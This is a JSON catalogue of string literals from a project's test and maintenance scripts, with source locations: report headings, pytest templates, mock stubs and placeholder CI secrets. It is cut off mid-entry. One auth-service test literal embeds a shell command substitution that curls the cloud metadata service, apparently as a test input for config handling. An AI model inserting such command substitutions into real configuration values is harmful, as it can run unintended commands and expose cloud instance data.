{
  "metadata": {
    "version": "3.0.0",
    "category": "test_literals",
    "generated_at": "2025-08-25T02:39:32.427934",
    "root_directory": "C:\\Users\\antho\\OneDrive\\Desktop\\Netra\\netra-core-generation-1",
    "total_literals": 7493
  },
  "literals": {
    "\u001b[0m": {
      "value": "\u001b[0m",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:71",
        "scripts/test_discovery_report.py:126",
        "scripts/test_discovery_report.py:127",
        "scripts/test_discovery_report.py:128"
      ]
    },
    "\u001b[0m -": {
      "value": "\u001b[0m -",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:93"
      ]
    },
    "\u001b[91m": {
      "value": "\u001b[91m",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:71",
        "scripts/test_discovery_report.py:93",
        "scripts/test_discovery_report.py:106",
        "scripts/test_discovery_report.py:126",
        "scripts/test_discovery_report.py:127",
        "scripts/test_discovery_report.py:128"
      ]
    },
    "\u001b[91mReal E2E Tests:": {
      "value": "\u001b[91mReal E2E Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:118"
      ]
    },
    "!!! DANGEROUS MODE ENABLED !!!": {
      "value": "!!! DANGEROUS MODE ENABLED !!!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:949"
      ]
    },
    "!@#$%^&*()_+-=[]{}|;:,.<>?": {
      "value": "!@#$%^&*()_+-=[]{}|;:,.<>?",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:86"
      ]
    },
    "\"": {
      "value": "\"",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:134",
        "auth_service/tests/database/test_config.py:152",
        "auth_service/tests/test_critical_oauth_environment_failures.py:366",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:173",
        "scripts/align_test_imports.py:379",
        "scripts/align_test_imports.py:380",
        "scripts/remove_test_stubs.py:297",
        "scripts/remove_test_stubs.py:299",
        "scripts/standardize_l3_test_names.py:65",
        "scripts/standardize_l3_test_names.py:65"
      ]
    },
    "\" does not exist": {
      "value": "\" does not exist",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:120"
      ]
    },
    "\"\"\"": {
      "value": "\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:156",
        "scripts/auto_fix_test_sizes.py:381",
        "scripts/auto_fix_test_sizes.py:384",
        "scripts/auto_fix_test_sizes.py:386",
        "scripts/auto_fix_test_sizes.py:386",
        "scripts/auto_fix_test_violations.py:517",
        "scripts/auto_fix_test_violations.py:520",
        "scripts/auto_fix_test_violations.py:546",
        "scripts/auto_fix_test_violations.py:549",
        "scripts/compliance/project_test_validator.py:235"
      ]
    },
    "\"\"\"\n\nimport pytest\nfrom unittest.mock import Mock, patch, MagicMock\nimport sys\nfrom pathlib import Path\n\n# Add parent directory to path\n\nfrom": {
      "value": "\"\"\"\n\nimport pytest\nfrom unittest.mock import Mock, patch, MagicMock\nimport sys\nfrom pathlib import Path\n\n# Add parent directory to path\n\nfrom",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:103"
      ]
    },
    "\"\"\"\n    \n    @pytest.fixture(autouse=True)\n    def setup(self):\n        \"\"\"Set up test fixtures\"\"\"\n        self.mock_data = {\"test\": \"data\"}\n        yield\n        # Cleanup if needed": {
      "value": "\"\"\"\n    \n    @pytest.fixture(autouse=True)\n    def setup(self):\n        \"\"\"Set up test fixtures\"\"\"\n        self.mock_data = {\"test\": \"data\"}\n        yield\n        # Cleanup if needed",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:122"
      ]
    },
    "\"\"\"\n        # Critical function - test error scenarios\n        with pytest.raises(Exception):\n            pass  # TODO: Add actual error test": {
      "value": "\"\"\"\n        # Critical function - test error scenarios\n        with pytest.raises(Exception):\n            pass  # TODO: Add actual error test",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:176"
      ]
    },
    "\"\"\"\n        # High complexity function - test boundary conditions\n        pass": {
      "value": "\"\"\"\n        # High complexity function - test boundary conditions\n        pass",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:166"
      ]
    },
    "\"\"\"\n        # TODO: Implement based on function signature\n        # Function args:": {
      "value": "\"\"\"\n        # TODO: Implement based on function signature\n        # Function args:",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:153"
      ]
    },
    "\"\"\"\nTests for": {
      "value": "\"\"\"\nTests for",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:100"
      ]
    },
    "\"\"\".*for testing.*\"\"\"": {
      "value": "\"\"\".*for testing.*\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:50"
      ]
    },
    "\"\"\".*mock implementation.*\"\"\"": {
      "value": "\"\"\".*mock implementation.*\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:48"
      ]
    },
    "\"\"\".*test implementation.*\"\"\"": {
      "value": "\"\"\".*test implementation.*\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:49"
      ]
    },
    "\"\"\"Split from": {
      "value": "\"\"\"Split from",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:575"
      ]
    },
    "\"\"\"Split test module - imports all parts.\"\"\"": {
      "value": "\"\"\"Split test module - imports all parts.\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:196"
      ]
    },
    "\"\"\"Test class for orphaned methods\"\"\"": {
      "value": "\"\"\"Test class for orphaned methods\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:95"
      ]
    },
    "\"\"\"Test module.\"\"\"": {
      "value": "\"\"\"Test module.\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:67"
      ]
    },
    "\",": {
      "value": "\",",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:297"
      ]
    },
    "\",\"": {
      "value": "\",\"",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:298",
        "scripts/remove_test_stubs.py:298",
        "scripts/remove_test_stubs.py:299"
      ]
    },
    "\"agent\"": {
      "value": "\"agent\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:510"
      ]
    },
    "\"auth or security\"": {
      "value": "\"auth or security\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:511"
      ]
    },
    "\"database or db\"": {
      "value": "\"database or db\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:508"
      ]
    },
    "\"e2e\"": {
      "value": "\"e2e\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:512"
      ]
    },
    "\"integration\"": {
      "value": "\"integration\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:506"
      ]
    },
    "\"not integration and not e2e\"": {
      "value": "\"not integration and not e2e\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:505"
      ]
    },
    "\"performance\"": {
      "value": "\"performance\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:513"
      ]
    },
    "\"smoke\"": {
      "value": "\"smoke\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:504"
      ]
    },
    "\"websocket or ws\"": {
      "value": "\"websocket or ws\"",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:509"
      ]
    },
    "#": {
      "value": "#",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:491",
        "scripts/auto_fix_test_sizes.py:496",
        "scripts/auto_fix_test_violations.py:260",
        "scripts/compliance/project_test_validator.py:226",
        "scripts/compliance/real_test_requirements_enforcer.py:308",
        "scripts/compliance/real_test_validator.py:193",
        "scripts/compliance/test_fixer.py:193",
        "scripts/compliance/test_fixer.py:278",
        "scripts/compliance/test_size_validator.py:305",
        "scripts/fix_all_test_issues.py:55"
      ]
    },
    "# ACT Secrets for local testing\nGITHUB_TOKEN=mock_github_token\nGCP_CREDENTIALS={\"type\":\"service_account\"}\nGCP_PROJECT_ID=mock-project\nDOCKER_REGISTRY=localhost:5000\nSTAGING_SSH_KEY=mock_ssh_key\nSTAGING_HOST=localhost\nSTAGING_USER=testuser\nSLACK_WEBHOOK_URL=https://mock.webhook.url": {
      "value": "# ACT Secrets for local testing\nGITHUB_TOKEN=mock_github_token\nGCP_CREDENTIALS={\"type\":\"service_account\"}\nGCP_PROJECT_ID=mock-project\nDOCKER_REGISTRY=localhost:5000\nSTAGING_SSH_KEY=mock_ssh_key\nSTAGING_HOST=localhost\nSTAGING_USER=testuser\nSLACK_WEBHOOK_URL=https://mock.webhook.url",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:80"
      ]
    },
    "# ACT environment detection - ACT sets this automatically": {
      "value": "# ACT environment detection - ACT sets this automatically",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:257"
      ]
    },
    "# ACT will override": {
      "value": "# ACT will override",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:237"
      ]
    },
    "# Add project root to path": {
      "value": "# Add project root to path",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:176",
        "scripts/fix_test_import_order.py:73"
      ]
    },
    "# Agent models - creating mocks for tests\nfrom unittest.mock import Mock\nAgent = Mock\nAgentRun = Mock": {
      "value": "# Agent models - creating mocks for tests\nfrom unittest.mock import Mock\nAgent = Mock\nAgentRun = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:133"
      ]
    },
    "# AgentRun model - creating mock for tests\nfrom unittest.mock import Mock\nAgentRun = Mock": {
      "value": "# AgentRun model - creating mock for tests\nfrom unittest.mock import Mock\nAgentRun = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:128"
      ]
    },
    "# ClickHouseManager - creating mock for tests\nfrom unittest.mock import Mock\nClickHouseManager = Mock": {
      "value": "# ClickHouseManager - creating mock for tests\nfrom unittest.mock import Mock\nClickHouseManager = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:79"
      ]
    },
    "# Complexity:": {
      "value": "# Complexity:",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:156"
      ]
    },
    "# ConversionEvent model - creating mock for tests\nfrom unittest.mock import Mock\nConversionEvent = Mock": {
      "value": "# ConversionEvent model - creating mock for tests\nfrom unittest.mock import Mock\nConversionEvent = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:86"
      ]
    },
    "# Critical Path Tests\nclass TestCriticalPaths:\n    \"\"\"Tests for critical execution paths\"\"\"": {
      "value": "# Critical Path Tests\nclass TestCriticalPaths:\n    \"\"\"Tests for critical execution paths\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:227"
      ]
    },
    "# Database test fixtures - using mocks\nfrom unittest.mock import Mock, AsyncMock\nDatabaseErrorSimulator = Mock\nMockConnectionPool = Mock\nasync_session_mock = AsyncMock\nconnection_pool = Mock\ntransaction_session_mock = AsyncMock": {
      "value": "# Database test fixtures - using mocks\nfrom unittest.mock import Mock, AsyncMock\nDatabaseErrorSimulator = Mock\nMockConnectionPool = Mock\nasync_session_mock = AsyncMock\nconnection_pool = Mock\ntransaction_session_mock = AsyncMock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:98"
      ]
    },
    "# FIXME:": {
      "value": "# FIXME:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:47",
        "scripts/fix_all_test_issues.py:60"
      ]
    },
    "# Generated from": {
      "value": "# Generated from",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:603"
      ]
    },
    "# Has return:": {
      "value": "# Has return:",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:155"
      ]
    },
    "# Incomplete import statement": {
      "value": "# Incomplete import statement",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:114"
      ]
    },
    "# Justified:": {
      "value": "# Justified:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:81"
      ]
    },
    "# Message model - creating mock for tests\nfrom unittest.mock import Mock\nMessage = Mock": {
      "value": "# Message model - creating mock for tests\nfrom unittest.mock import Mock\nMessage = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:115"
      ]
    },
    "# Mock implementation": {
      "value": "# Mock implementation",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:51"
      ]
    },
    "# Mock justified": {
      "value": "# Mock justified",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:81"
      ]
    },
    "# Project Real Test Requirements Violations": {
      "value": "# Project Real Test Requirements Violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:322"
      ]
    },
    "# REDUNDANT TEST - Marked for removal by Autonomous Test Reviewer\\n# Reason: Duplicate coverage or obsolete functionality\\n# Review and remove if confirmed redundant\\n\\n": {
      "value": "# REDUNDANT TEST - Marked for removal by Autonomous Test Reviewer\\n# Reason: Duplicate coverage or obsolete functionality\\n# Review and remove if confirmed redundant\\n\\n",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:68"
      ]
    },
    "# Real Service Test Report": {
      "value": "# Real Service Test Report",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:123"
      ]
    },
    "# Real Test Requirements Fix Plan": {
      "value": "# Real Test Requirements Fix Plan",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:191"
      ]
    },
    "# Real Test Requirements Violations Report": {
      "value": "# Real Test Requirements Violations Report",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:484",
        "scripts/compliance/real_test_validator.py:278"
      ]
    },
    "# Real component behavior: \\1 handles \\2": {
      "value": "# Real component behavior: \\1 handles \\2",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:326"
      ]
    },
    "# Real component setup: \\1 configured for \\2": {
      "value": "# Real component setup: \\1 configured for \\2",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:325"
      ]
    },
    "# Run with coverage\n  python unified_test_runner.py --service backend --coverage --min-coverage 80\n  \n  # Run specific test file\n  python unified_test_runner.py --service backend netra_backend/tests/test_main.py\n  \n  # Run tests matching keyword\n  python unified_test_runner.py --service backend -k \"test_login\"\n  \n  # Quick smoke test\n  python unified_test_runner.py --service backend --category smoke --fail-fast\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service backend --coverage --html-output --json-output --parallel auto": {
      "value": "# Run with coverage\n  python unified_test_runner.py --service backend --coverage --min-coverage 80\n  \n  # Run specific test file\n  python unified_test_runner.py --service backend netra_backend/tests/test_main.py\n  \n  # Run tests matching keyword\n  python unified_test_runner.py --service backend -k \"test_login\"\n  \n  # Quick smoke test\n  python unified_test_runner.py --service backend --category smoke --fail-fast\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service backend --coverage --html-output --json-output --parallel auto",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:459"
      ]
    },
    "# Setup test path\\n(?=\\n)": {
      "value": "# Setup test path\\n(?=\\n)",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:38"
      ]
    },
    "# TODO: Implement split test logic": {
      "value": "# TODO: Implement split test logic",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:578"
      ]
    },
    "# Team model - creating mock for tests\nfrom unittest.mock import Mock\nTeam = Mock": {
      "value": "# Team model - creating mock for tests\nfrom unittest.mock import Mock\nTeam = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:91"
      ]
    },
    "# Test Organization Audit Report\n\n## Executive Summary\n\nThe Netra codebase test organization analysis reveals opportunities for improvement in test structure and maintenance.\n\n## Current State Analysis\n\n### 1. Test File Distribution\n- **": {
      "value": "# Test Organization Audit Report\n\n## Executive Summary\n\nThe Netra codebase test organization analysis reveals opportunities for improvement in test structure and maintenance.\n\n## Current State Analysis\n\n### 1. Test File Distribution\n- **",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:149"
      ]
    },
    "# Test Overlap Analysis Report": {
      "value": "# Test Overlap Analysis Report",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:518"
      ]
    },
    "# Test Size Compliance Report": {
      "value": "# Test Size Compliance Report",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:453"
      ]
    },
    "# Test Size Violations Report": {
      "value": "# Test Size Violations Report",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:853"
      ]
    },
    "# Test implementation": {
      "value": "# Test implementation",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:53"
      ]
    },
    "# Test stub": {
      "value": "# Test stub",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:52"
      ]
    },
    "# Thread model - creating mock for tests\nfrom unittest.mock import Mock\nThread = Mock": {
      "value": "# Thread model - creating mock for tests\nfrom unittest.mock import Mock\nThread = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:110"
      ]
    },
    "# User journey data - creating mocks\nfrom unittest.mock import Mock\nUserTestData = Mock()\nUserJourneyScenarios = Mock()": {
      "value": "# User journey data - creating mocks\nfrom unittest.mock import Mock\nUserTestData = Mock()\nUserJourneyScenarios = Mock()",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:121"
      ]
    },
    "# UserFlowTestBase - using unittest.TestCase\nimport unittest\nfrom unittest.mock import Mock\nUserFlowTestBase = unittest.TestCase\nassert_successful_registration = Mock\nassert_plan_compliance = Mock": {
      "value": "# UserFlowTestBase - using unittest.TestCase\nimport unittest\nfrom unittest.mock import Mock\nUserFlowTestBase = unittest.TestCase\nassert_successful_registration = Mock\nassert_plan_compliance = Mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:103"
      ]
    },
    "# Workflow Status Verification Results\n\n## Script Functionality Verification\n\nThe verify_workflow_status.py script has been thoroughly tested and verified to work correctly.\n\n### Key Findings:\n\n1. **Argument Validation**: ✅ WORKING\n   - Properly validates required arguments\n   - Correctly handles invalid argument combinations\n   - Provides clear error messages\n\n2. **Authentication Handling**: ✅ WORKING\n   - Properly checks for GitHub token\n   - Handles missing tokens gracefully\n   - Attempts API calls and handles authentication failures\n\n3. **Error Handling**: ✅ WORKING\n   - Gracefully handles API errors\n   - Provides meaningful error messages\n   - Uses proper exit codes\n\n4. **Output Formatting**: ✅ WORKING\n   - Accepts both table and JSON output formats\n   - Processes arguments correctly\n\n5. **Help System**: ✅ WORKING\n   - Displays comprehensive help text\n   - Shows usage examples\n\n### Test Results:": {
      "value": "# Workflow Status Verification Results\n\n## Script Functionality Verification\n\nThe verify_workflow_status.py script has been thoroughly tested and verified to work correctly.\n\n### Key Findings:\n\n1. **Argument Validation**: ✅ WORKING\n   - Properly validates required arguments\n   - Correctly handles invalid argument combinations\n   - Provides clear error messages\n\n2. **Authentication Handling**: ✅ WORKING\n   - Properly checks for GitHub token\n   - Handles missing tokens gracefully\n   - Attempts API calls and handles authentication failures\n\n3. **Error Handling**: ✅ WORKING\n   - Gracefully handles API errors\n   - Provides meaningful error messages\n   - Uses proper exit codes\n\n4. **Output Formatting**: ✅ WORKING\n   - Accepts both table and JSON output formats\n   - Processes arguments correctly\n\n5. **Help System**: ✅ WORKING\n   - Displays comprehensive help text\n   - Shows usage examples\n\n### Test Results:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:214"
      ]
    },
    "# Workflow Status Verification Test Report\n\n## Summary\n- **Total Tests**:": {
      "value": "# Workflow Status Verification Test Report\n\n## Summary\n- **Total Tests**:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:164"
      ]
    },
    "##": {
      "value": "##",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:344"
      ]
    },
    "## Cache Performance": {
      "value": "## Cache Performance",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:172"
      ]
    },
    "## Category Analysis": {
      "value": "## Category Analysis",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:546"
      ]
    },
    "## Database Performance": {
      "value": "## Database Performance",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:158"
      ]
    },
    "## Errors": {
      "value": "## Errors",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:207"
      ]
    },
    "## Exact Duplicates ⚠️": {
      "value": "## Exact Duplicates ⚠️",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:584"
      ]
    },
    "## Executive Summary": {
      "value": "## Executive Summary",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:521"
      ]
    },
    "## File Splits Required": {
      "value": "## File Splits Required",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:200"
      ]
    },
    "## Function Refactoring Required": {
      "value": "## Function Refactoring Required",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:207"
      ]
    },
    "## Highly Similar Tests": {
      "value": "## Highly Similar Tests",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:599"
      ]
    },
    "## Identified Issues\n\n### 1. Configuration Sprawl": {
      "value": "## Identified Issues\n\n### 1. Configuration Sprawl",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:201"
      ]
    },
    "## Immediate Fixes (Can be automated)": {
      "value": "## Immediate Fixes (Can be automated)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:194"
      ]
    },
    "## Impact Analysis": {
      "value": "## Impact Analysis",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:498"
      ]
    },
    "## LLM API Usage": {
      "value": "## LLM API Usage",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:146"
      ]
    },
    "## Mock Reduction Required": {
      "value": "## Mock Reduction Required",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:216"
      ]
    },
    "## Most Problematic Files": {
      "value": "## Most Problematic Files",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:316"
      ]
    },
    "## Quality Gate Scores": {
      "value": "## Quality Gate Scores",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:184"
      ]
    },
    "## Recommendations": {
      "value": "## Recommendations",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:534"
      ]
    },
    "## Recommendations\n\n### Immediate Actions (Priority 1)\n1. **Consolidate Configuration**: Reduce conftest.py files to service-level only\n2. **Standardize Naming**: Use consistent `test_*.py` pattern\n3. **Archive Legacy Tests**: Move or remove legacy test directories\n\n### Short-term Improvements (Priority 2)\n1. **Simplify Test Framework**: Reduce test_framework to essential components\n2. **Unify Test Runners**: Single test runner with clear options\n3. **Clear Test Levels**: Define and document 3-5 clear test levels\n\n### Long-term Goals (Priority 3)\n1. **Test Organization**: Group tests by domain/service\n2. **Performance Optimization**: Implement proper parallel execution\n3. **Documentation**: Single source of truth for test guidelines\n\n## Business Impact\n\n- **Development Velocity**: Test complexity impacts productivity\n- **Maintenance Burden**: Complex structure requires more maintenance\n- **Quality Assurance**: Disorganized tests reduce confidence\n\n## Next Steps\n\n1. Run this audit regularly to track improvements\n2. Prioritize fixes based on development impact\n3. Document decisions in SPEC/learnings/testing.xml": {
      "value": "## Recommendations\n\n### Immediate Actions (Priority 1)\n1. **Consolidate Configuration**: Reduce conftest.py files to service-level only\n2. **Standardize Naming**: Use consistent `test_*.py` pattern\n3. **Archive Legacy Tests**: Move or remove legacy test directories\n\n### Short-term Improvements (Priority 2)\n1. **Simplify Test Framework**: Reduce test_framework to essential components\n2. **Unify Test Runners**: Single test runner with clear options\n3. **Clear Test Levels**: Define and document 3-5 clear test levels\n\n### Long-term Goals (Priority 3)\n1. **Test Organization**: Group tests by domain/service\n2. **Performance Optimization**: Implement proper parallel execution\n3. **Documentation**: Single source of truth for test guidelines\n\n## Business Impact\n\n- **Development Velocity**: Test complexity impacts productivity\n- **Maintenance Burden**: Complex structure requires more maintenance\n- **Quality Assurance**: Disorganized tests reduce confidence\n\n## Next Steps\n\n1. Run this audit regularly to track improvements\n2. Prioritize fixes based on development impact\n3. Document decisions in SPEC/learnings/testing.xml",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:230"
      ]
    },
    "## Splitting Suggestions": {
      "value": "## Splitting Suggestions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:492"
      ]
    },
    "## Summary": {
      "value": "## Summary",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:457"
      ]
    },
    "## Test Details by Category": {
      "value": "## Test Details by Category",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:193"
      ]
    },
    "## Test Results Summary": {
      "value": "## Test Results Summary",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:135"
      ]
    },
    "## Test Validation Status": {
      "value": "## Test Validation Status",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:898"
      ]
    },
    "## Top 20 Worst Violators": {
      "value": "## Top 20 Worst Violators",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:876"
      ]
    },
    "## Violations": {
      "value": "## Violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:466"
      ]
    },
    "## Violations by Type": {
      "value": "## Violations by Type",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:295"
      ]
    },
    "## Warnings": {
      "value": "## Warnings",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:217"
      ]
    },
    "## ⚠️ WARNING": {
      "value": "## ⚠️ WARNING",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:856"
      ]
    },
    "## 🎯 Priority Fix List": {
      "value": "## 🎯 Priority Fix List",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:546"
      ]
    },
    "## 📋 Violations by Category": {
      "value": "## 📋 Violations by Category",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:513"
      ]
    },
    "## 🛠️ Recommended Actions": {
      "value": "## 🛠️ Recommended Actions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:562"
      ]
    },
    "###": {
      "value": "###",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:559",
        "scripts/compliance/project_test_validator.py:355",
        "scripts/compliance/real_test_requirements_enforcer.py:521",
        "scripts/compliance/real_test_validator.py:298",
        "scripts/compliance/test_size_validator.py:496",
        "scripts/real_service_test_metrics.py:198",
        "scripts/test_verify_workflow_status.py:179"
      ]
    },
    "### 2. Test Locations\n\nTop test directories by file count:": {
      "value": "### 2. Test Locations\n\nTop test directories by file count:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:167"
      ]
    },
    "### 2. Test Organization": {
      "value": "### 2. Test Organization",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:216"
      ]
    },
    "### 3. Organizational Patterns\n\n#### 3.1 Test Naming Conventions": {
      "value": "### 3. Organizational Patterns\n\n#### 3.1 Test Naming Conventions",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:178"
      ]
    },
    "### 4. Key Test Directories": {
      "value": "### 4. Key Test Directories",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:191"
      ]
    },
    "### File Size Violations": {
      "value": "### File Size Violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:474"
      ]
    },
    "### Function Size Violations": {
      "value": "### Function Size Violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:483"
      ]
    },
    "### Similarity Breakdown": {
      "value": "### Similarity Breakdown",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:527"
      ]
    },
    "#### 3.2 Test Structure\n- Test directories:": {
      "value": "#### 3.2 Test Structure\n- Test directories:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:187"
      ]
    },
    "$": {
      "value": "$",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:173",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:318",
        "auth_service/tests/test_password_hashing_basics.py:106"
      ]
    },
    "$(": {
      "value": "$(",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:56",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:116"
      ]
    },
    "$(STAGING_DB_PASSWORD)": {
      "value": "$(STAGING_DB_PASSWORD)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:159"
      ]
    },
    "$(curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/id)": {
      "value": "$(curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/id)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:259",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:267"
      ]
    },
    "$(date +%s)": {
      "value": "$(date +%s)",
